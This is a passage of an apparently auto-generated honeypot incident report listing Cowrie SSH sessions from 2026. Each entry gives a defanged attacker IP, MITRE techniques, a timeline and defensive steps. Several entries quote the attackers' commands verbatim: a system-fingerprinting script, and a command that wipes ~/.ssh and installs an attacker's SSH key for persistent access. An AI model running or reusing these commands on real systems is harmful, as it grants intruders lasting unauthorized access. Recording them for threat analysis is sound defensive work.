| `2026-07-31 19:41:20` | `cowrie.client.version` |
| `2026-07-31 19:41:20` | `cowrie.client.kex` |
| `2026-07-31 19:41:20` | `cowrie.login.success` |
| `2026-07-31 19:41:21` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.2[.]51` to AbuseIPDB if not already reported
- [ ] Block `85.105.2[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6a8b176382

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:41 |
| **Last Seen** | 2026-07-31 19:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:41:54` | `cowrie.session.connect` |
| `2026-07-31 19:41:54` | `cowrie.client.version` |
| `2026-07-31 19:41:54` | `cowrie.client.kex` |
| `2026-07-31 19:41:56` | `cowrie.login.success` |
| `2026-07-31 19:41:58` | `cowrie.session.params` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.success` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.command.input` |
| `2026-07-31 19:41:58` | `cowrie.log.closed` |
| `2026-07-31 19:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be933a368f80

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-07-31 19:43 |
| **Last Seen** | 2026-07-31 19:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:43:53` | `cowrie.session.connect` |
| `2026-07-31 19:43:53` | `cowrie.client.version` |
| `2026-07-31 19:43:53` | `cowrie.client.kex` |
| `2026-07-31 19:43:55` | `cowrie.login.success` |
| `2026-07-31 19:43:56` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c584983a917

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:43 |
| **Last Seen** | 2026-07-31 19:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:43:55` | `cowrie.session.connect` |
| `2026-07-31 19:43:56` | `cowrie.client.version` |
| `2026-07-31 19:43:56` | `cowrie.client.kex` |
| `2026-07-31 19:43:57` | `cowrie.login.success` |
| `2026-07-31 19:43:59` | `cowrie.session.params` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.success` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:43:59` | `cowrie.command.input` |
| `2026-07-31 19:44:00` | `cowrie.log.closed` |
| `2026-07-31 19:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-740989b829cf

| Field | Detail |
|---|---|
| **Source IP** | `139.59.6[.]237` |
| **First Seen** | 2026-07-31 19:46 |
| **Last Seen** | 2026-07-31 19:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:46:12` | `cowrie.session.connect` |
| `2026-07-31 19:46:12` | `cowrie.client.version` |
| `2026-07-31 19:46:12` | `cowrie.client.kex` |
| `2026-07-31 19:46:13` | `cowrie.login.success` |
| `2026-07-31 19:46:14` | `cowrie.session.params` |
| `2026-07-31 19:46:14` | `cowrie.command.input` |
| `2026-07-31 19:46:14` | `cowrie.command.failed` |
| `2026-07-31 19:46:14` | `cowrie.log.closed` |
| `2026-07-31 19:46:15` | `cowrie.session.params` |
| `2026-07-31 19:46:15` | `cowrie.command.input` |
| `2026-07-31 19:46:16` | `cowrie.session.file_download` |
| `2026-07-31 19:46:16` | `cowrie.log.closed` |
| `2026-07-31 19:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.6[.]237` to AbuseIPDB if not already reported
- [ ] Block `139.59.6[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-201ba6a0849d

| Field | Detail |
|---|---|
| **Source IP** | `139.59.6[.]237` |
| **First Seen** | 2026-07-31 19:46 |
| **Last Seen** | 2026-07-31 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:46:16` | `cowrie.session.connect` |
| `2026-07-31 19:46:16` | `cowrie.client.version` |
| `2026-07-31 19:46:16` | `cowrie.client.kex` |
| `2026-07-31 19:46:17` | `cowrie.login.success` |
| `2026-07-31 19:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.6[.]237` to AbuseIPDB if not already reported
- [ ] Block `139.59.6[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ca805a852f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.6[.]237` |
| **First Seen** | 2026-07-31 19:46 |
| **Last Seen** | 2026-07-31 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:46:18` | `cowrie.session.connect` |
| `2026-07-31 19:46:18` | `cowrie.client.version` |
| `2026-07-31 19:46:18` | `cowrie.client.kex` |
| `2026-07-31 19:46:19` | `cowrie.login.success` |
| `2026-07-31 19:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.6[.]237` to AbuseIPDB if not already reported
- [ ] Block `139.59.6[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11cc1bbdd62d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:46 |
| **Last Seen** | 2026-07-31 19:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:46:41` | `cowrie.session.connect` |
| `2026-07-31 19:46:41` | `cowrie.client.version` |
| `2026-07-31 19:46:41` | `cowrie.client.kex` |
| `2026-07-31 19:46:43` | `cowrie.login.success` |
| `2026-07-31 19:46:45` | `cowrie.session.params` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.success` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.command.input` |
| `2026-07-31 19:46:45` | `cowrie.log.closed` |
| `2026-07-31 19:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7203816f985

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:48 |
| **Last Seen** | 2026-07-31 19:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:48:39` | `cowrie.session.connect` |
| `2026-07-31 19:48:39` | `cowrie.client.version` |
| `2026-07-31 19:48:39` | `cowrie.client.kex` |
| `2026-07-31 19:48:41` | `cowrie.login.success` |
| `2026-07-31 19:48:42` | `cowrie.session.params` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.success` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:42` | `cowrie.command.input` |
| `2026-07-31 19:48:43` | `cowrie.log.closed` |
| `2026-07-31 19:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e0f66288901

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:50 |
| **Last Seen** | 2026-07-31 19:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:50:49` | `cowrie.session.connect` |
| `2026-07-31 19:50:50` | `cowrie.client.version` |
| `2026-07-31 19:50:50` | `cowrie.client.kex` |
| `2026-07-31 19:50:52` | `cowrie.login.success` |
| `2026-07-31 19:50:54` | `cowrie.session.params` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.success` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.command.input` |
| `2026-07-31 19:50:54` | `cowrie.log.closed` |
| `2026-07-31 19:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5f9e5059855

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-07-31 19:51 |
| **Last Seen** | 2026-07-31 19:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:51:19` | `cowrie.session.connect` |
| `2026-07-31 19:51:19` | `cowrie.client.version` |
| `2026-07-31 19:51:19` | `cowrie.client.kex` |
| `2026-07-31 19:51:20` | `cowrie.login.success` |
| `2026-07-31 19:51:21` | `cowrie.session.params` |
| `2026-07-31 19:51:21` | `cowrie.command.input` |
| `2026-07-31 19:51:21` | `cowrie.command.failed` |
| `2026-07-31 19:51:21` | `cowrie.log.closed` |
| `2026-07-31 19:51:22` | `cowrie.session.params` |
| `2026-07-31 19:51:22` | `cowrie.command.input` |
| `2026-07-31 19:51:22` | `cowrie.session.file_download` |
| `2026-07-31 19:51:22` | `cowrie.log.closed` |
| `2026-07-31 19:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a01f13290f7e

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-07-31 19:51 |
| **Last Seen** | 2026-07-31 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:51:22` | `cowrie.session.connect` |
| `2026-07-31 19:51:22` | `cowrie.client.version` |
| `2026-07-31 19:51:22` | `cowrie.client.kex` |
| `2026-07-31 19:51:23` | `cowrie.login.success` |
| `2026-07-31 19:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929accd8ee4b

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-07-31 19:51 |
| **Last Seen** | 2026-07-31 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:51:23` | `cowrie.session.connect` |
| `2026-07-31 19:51:23` | `cowrie.client.version` |
| `2026-07-31 19:51:23` | `cowrie.client.kex` |
| `2026-07-31 19:51:24` | `cowrie.login.success` |
| `2026-07-31 19:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3c3ea2609e

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-07-31 19:52 |
| **Last Seen** | 2026-07-31 19:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:52:34` | `cowrie.session.connect` |
| `2026-07-31 19:52:35` | `cowrie.client.version` |
| `2026-07-31 19:52:35` | `cowrie.client.kex` |
| `2026-07-31 19:52:37` | `cowrie.login.success` |
| `2026-07-31 19:52:38` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfce8e69b49c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:52 |
| **Last Seen** | 2026-07-31 19:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:52:50` | `cowrie.session.connect` |
| `2026-07-31 19:52:51` | `cowrie.client.version` |
| `2026-07-31 19:52:51` | `cowrie.client.kex` |
| `2026-07-31 19:52:52` | `cowrie.login.success` |
| `2026-07-31 19:52:54` | `cowrie.session.params` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.success` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:54` | `cowrie.command.input` |
| `2026-07-31 19:52:55` | `cowrie.log.closed` |
| `2026-07-31 19:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec0ab971d9e2

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-07-31 19:53 |
| **Last Seen** | 2026-07-31 19:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:53:12` | `cowrie.session.connect` |
| `2026-07-31 19:53:13` | `cowrie.client.version` |
| `2026-07-31 19:53:13` | `cowrie.client.kex` |
| `2026-07-31 19:53:15` | `cowrie.login.success` |
| `2026-07-31 19:53:15` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96323d10d3e8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:54 |
| **Last Seen** | 2026-07-31 19:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:54:52` | `cowrie.session.connect` |
| `2026-07-31 19:54:53` | `cowrie.client.version` |
| `2026-07-31 19:54:53` | `cowrie.client.kex` |
| `2026-07-31 19:54:54` | `cowrie.login.success` |
| `2026-07-31 19:54:56` | `cowrie.session.params` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.success` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.command.input` |
| `2026-07-31 19:54:56` | `cowrie.log.closed` |
